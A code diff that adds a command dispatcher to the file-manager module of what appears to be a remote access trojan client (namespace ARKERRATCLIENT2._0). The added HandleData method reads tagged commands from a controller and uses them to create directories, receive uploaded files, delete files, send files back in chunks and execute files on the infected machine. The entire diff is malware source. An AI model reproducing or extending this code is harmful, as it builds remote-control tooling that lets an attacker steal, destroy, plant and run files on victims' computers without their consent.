@@ -13,6 +13,58 @@ namespace ARKERRATCLIENT2._0
 {
     public static class FileManager
     {
+        public static void HandleData(string subString)
+        {
+            if (subString.Contains("§ND§"))
+            {
+                subString = subString.Replace("§ND§", string.Empty);
+                CreateNewDirectory(subString);
+            }
+            else if (subString.Contains("§UF§"))
+            {
+                subString = subString.Replace("§UF§", string.Empty);
+
+                if (subString.Contains("§start§") && !download)
+                {
+                    subString = subString.Replace("§start§", string.Empty);
+                    Task.Run(() => StartDownloadingFile(subString));
+                }
+                else if (subString == "§end§")
+                {
+                    download = false;
+                    dataBuffer = new System.Collections.Concurrent.ConcurrentQueue<string>();
+                }
+                else
+                {
+                    dataBuffer.Enqueue(subString);
+                }
+            }
+            else if (subString.Contains("§delete§"))
+            {
+                subString = subString.Replace("§delete§", string.Empty);
+                DeleteObject(subString);
+            }
+            else if (subString.Contains("§DF§"))
+            {
+                subString = subString.Replace("§DF§", string.Empty);
+                SendFileChunks(subString);
+            }
+            else if (subString.Contains("§exe§"))
+            {
+                subString = subString.Replace("§exe§", string.Empty);
+                ExecuteFile(subString);
+
+            }
+            else if (subString == "close")
+            {
+                CloseFileManager();
+            }
+            else
+            {
+                SendFileSystem(subString);
+            }
+        }
+
         public static bool download = false;
         static public async void SendFileSystem(string path)
         {
